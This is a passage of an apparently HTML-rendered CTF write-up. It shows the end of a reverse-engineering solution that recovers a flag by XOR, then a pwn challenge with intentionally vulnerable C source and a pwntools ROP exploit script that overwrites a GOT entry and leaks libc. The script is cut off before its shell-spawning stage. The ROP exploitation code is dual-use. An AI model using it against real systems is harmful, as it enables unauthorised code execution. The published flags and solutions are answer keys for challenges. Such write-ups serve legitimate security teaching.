+</span></span><span style="display:flex;"><span>           ((<span style="color:#555">&amp;</span>DAT_00100b20)[idx] <span style="color:#555">^</span> <span style="color:#555">*</span>(uint <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)curr_char_pass <span style="color:#555">+</span> idx <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">^</span> <span style="color:#555">*</span>_expected_char) <span style="color:#555">==</span>
+</span></span><span style="display:flex;"><span>           (<span style="color:#555">&amp;</span>DAT_00100cc0)[idx] <span style="color:#555">&amp;&amp;</span> (new_arr5 <span style="color:#555">=</span> password, idx <span style="color:#555">!=</span> <span style="color:#f60">26</span>)) <span style="color:#555">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>          (new_arr5 <span style="color:#555">=</span> new_arr,
+</span></span><span style="display:flex;"><span>          ((<span style="color:#555">&amp;</span>DAT_00100b24)[idx] <span style="color:#555">^</span> <span style="color:#555">*</span>(uint <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)curr_char_pass <span style="color:#555">+</span> idx <span style="color:#555">*</span> <span style="color:#f60">4</span> <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">^</span> _expected_char[<span style="color:#555">-</span><span style="color:#f60">1</span>]
+</span></span><span style="display:flex;"><span>          ) <span style="color:#555">==</span> (<span style="color:#555">&amp;</span>DAT_00100cc4)[idx])); _expected_char <span style="color:#555">=</span> _expected_char <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">2</span>) {
+</span></span><span style="display:flex;"><span>        idx <span style="color:#555">=</span> idx <span style="color:#555">+</span> <span style="color:#f60">2</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">!=</span> local_38) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> new_arr5;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reading the code, we know that the password length is 27, and the native lib have three different keys in the native (<code>key_a</code> which is <code>DAT_00100b20</code>, <code>key_b</code> which is <code>DAT_00100c8c</code> and <code>key_c</code> which is <code>DAT_00100cc0</code> ). What it do is
+<code>input[i] ^ key_a[i] ^ key_b[-i] = key_c[i]</code>
+And merging with the Login logic, the final operation would be
+<code>password[i] ^ x0[i] ^ key_a[i] ^ key_b[-i] = key_c[i]</code>
+So to generate the password (which is the flag), we just need to do:
+<code>password[i] = x0[i] ^ key_a[i] ^ key_b[-i] ^ key_c[i]</code></p>
+<p>Full code:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>key_a <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\xd0\x45\x28\x76\x6f\xf3\x5a\xf4\xc7\xce\xfb\xc3\x7f\x48\xce\x3c\x3a\x0b\xf1\x53\xb1\x4b\xb9\x5e\xa2\x65\x77</span><span style="color:#c30">&#39;</span>
+</span></span><span style="display:flex;"><span>key_b <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x4c\x7b\x73\x6f\x72\x72\x79\x2e\x74\x68\x69\x73\x2e\x69\x73\x2e\x4e\x4f\x54\x2e\x74\x68\x65\x2e\x66\x6c\x61</span><span style="color:#c30">&#39;</span>
+</span></span><span style="display:flex;"><span>key_c <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x80\xe3\xda\xc7\x2e\xf1\xa2\x91\x6b\xdc\x6b\xb5\xe5\xaf\x3f\xb9\xee\x5b\x26\x92\x66\xc5\xcb\xde\x81\x79\xda</span><span style="color:#c30">&#39;</span>
+</span></span><span style="display:flex;"><span>x0 <span style="color:#555">=</span> [<span style="color:#f60">121</span>, <span style="color:#f60">134</span>, <span style="color:#f60">239</span>, <span style="color:#f60">213</span>, <span style="color:#f60">16</span>, <span style="color:#f60">28</span>, <span style="color:#f60">184</span>, <span style="color:#f60">101</span>, <span style="color:#f60">150</span>, <span style="color:#f60">60</span>, <span style="color:#f60">170</span>, <span style="color:#f60">49</span>, <span style="color:#f60">159</span>, <span style="color:#f60">189</span>, <span style="color:#f60">241</span>, <span style="color:#f60">146</span>, <span style="color:#f60">141</span>, <span style="color:#f60">22</span>, <span style="color:#f60">205</span>, <span style="color:#f60">223</span>, <span style="color:#f60">218</span>, <span style="color:#f60">210</span>, <span style="color:#f60">99</span>, <span style="color:#f60">219</span>, <span style="color:#f60">34</span>, <span style="color:#f60">84</span>, <span style="color:#f60">156</span>, <span style="color:#f60">237</span>, <span style="color:#f60">26</span>, <span style="color:#f60">94</span>, <span style="color:#f60">178</span>, <span style="color:#f60">230</span>, <span style="color:#f60">27</span>, <span style="color:#f60">180</span>, <span style="color:#f60">72</span>, <span style="color:#f60">32</span>, <span style="color:#f60">102</span>, <span style="color:#f60">192</span>, <span style="color:#f60">178</span>, <span style="color:#f60">234</span>, <span style="color:#f60">228</span>, <span style="color:#f60">38</span>, <span style="color:#f60">37</span>, <span style="color:#f60">142</span>, <span style="color:#f60">242</span>, <span style="color:#f60">142</span>, <span style="color:#f60">133</span>, <span style="color:#f60">159</span>, <span style="color:#f60">142</span>, <span style="color:#f60">33</span>]
+</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">27</span>):
+</span></span><span style="display:flex;"><span>    flag <span style="color:#555">+=</span> <span style="color:#366">chr</span>(key_a[i]<span style="color:#555">^</span>key_b[<span style="color:#555">-</span>(i<span style="color:#555">+</span><span style="color:#f60">1</span>)]<span style="color:#555">^</span>key_c[i]<span style="color:#555">^</span>x0[i])
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: HL{J4v4.nativ3.d0.n0t.c4r3}</p>
+</blockquote>
+<h2 id="crysys">CrySYS <a href="#crysys" class="anchor">#</a></h2>
+<p>We were given a binary that is pretty short</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;unistd.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//gcc -o challenge -no-pie -fno-stack-protector challenges.c
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">not_vulnerable</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#078;font-weight:bold">char</span> buf[<span style="color:#f60">80</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> read(<span style="color:#f60">0</span>, buf, <span style="color:#f60">0x1000</span>); 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(){
+</span></span><span style="display:flex;"><span>	not_vulnerable();
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is a buffer overflow vulnerability. Because the plt only contains read, we need to do partial overwrite (1 byte) to the read_got value so that we can execute <code>syscall</code>. The idea to gain the shell is:</p>
+<ul>
+<li>Overwrite RIP to read_plt</li>
+<li>Overwrite read_got to syscall with read (1 last byte)</li>
+<li>Rax = 1, If we call read_plt (which now is syscall), we can leak the got address and retrieve the libc base address</li>
+<li>Set rax to 0</li>
+<li>Syscall read again to load our second payload into .bss (Second payload will execute system(&quot;/bin/sh&quot;))</li>
+<li>Set rsp to the .bss</li>
+<li>Pop &ldquo;/bin/sh&rdquo; to rdi</li>
+<li>Ret to system</li>
+</ul>
+<p>Below is my full payload</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chosen BSS</span>
+</span></span><span style="display:flex;"><span>bss <span style="color:#555">=</span> <span style="color:#f60">0x00601030</span><span style="color:#555">+</span><span style="color:#f60">0x400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># readelf -s libc-2.27.so | grep &#34;read&#34; = 0x0000000000110070</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># I choose to redirect it to directly syscall inside read (read+15)</span>
+</span></span><span style="display:flex;"><span>read_offset <span style="color:#555">=</span> <span style="color:#f60">0x000000000011007f</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read_plt <span style="color:#555">=</span> <span style="color:#f60">0x00000000004003f0</span>
+</span></span><span style="display:flex;"><span>read_got <span style="color:#555">=</span> <span style="color:#f60">0x601018</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#555">=</span> read_plt <span style="color:#09f;font-style:italic"># We will overwrite read_got to syscall, so basically syscall = read_plt</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># ROPGadget result</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> <span style="color:#f60">0x0000000000400583</span> <span style="color:#09f;font-style:italic"># pop rdi ; ret</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#555">=</span> <span style="color:#f60">0x0000000000400581</span> <span style="color:#09f;font-style:italic"># pop rsi ; pop r15 ; ret</span>
+</span></span><span style="display:flex;"><span>pop_rsp <span style="color:#555">=</span> <span style="color:#f60">0x000000000040057d</span> <span style="color:#09f;font-style:italic"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+</span></span><span style="display:flex;"><span>mov_eax_0_pop_rbp <span style="color:#555">=</span> <span style="color:#f60">0x0000000000400515</span> <span style="color:#09f;font-style:italic"># mov eax, 0 ; pop rbp ; ret</span>
+</span></span><span style="display:flex;"><span>ret_address <span style="color:#555">=</span> <span style="color:#f60">0x00000000004003de</span> <span style="color:#09f;font-style:italic"># ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;./libc-2.27.so&#39;</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> process(<span style="color:#c30">&#39;./crySYS_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Load stage 2 rop</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">80</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(bss)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(pop_rsi_r15) <span style="color:#555">+</span> p64(read_got) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(read_plt) <span style="color:#09f;font-style:italic"># Overwrite 1 bytes, rax == 1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(pop_rdi) <span style="color:#555">+</span> p64(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(syscall) <span style="color:#09f;font-style:italic"># rax == 1 == write(1, got_addr)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(mov_eax_0_pop_rbp) <span style="color:#555">+</span> p64(bss<span style="color:#555">+</span><span style="color:#f60">72</span>) <span style="color:#09f;font-style:italic"># Set rax to 0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(pop_rdi) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(pop_rsi_r15) <span style="color:#555">+</span> p64(bss) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(syscall) <span style="color:#09f;font-style:italic"># read(0, bss)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(pop_rsp) <span style="color:#555">+</span> p64(bss) <span style="color:#09f;font-style:italic"># Set rsp to bss</span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#39;Payload sent...&#39;</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite 1 byte of read_got by syscall inside read</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x7f</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#39;Overwrite read got...&#39;</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After leaking the address, call system()</span>
+</span></span><span style="display:flex;"><span>leak_syscall_address <span style="color:#555">=</span> u64(r<span style="color:#555">.</span>recvn(<span style="color:#f60">8</span>))
+</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> leak_syscall_address <span style="color:#555">-</span> read_offset
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked syscall address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leak_syscall_address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked libc address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc<span style="color:#555">.</span>address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Craft payload to call system(&#39;/bin/sh&#39;)</span>
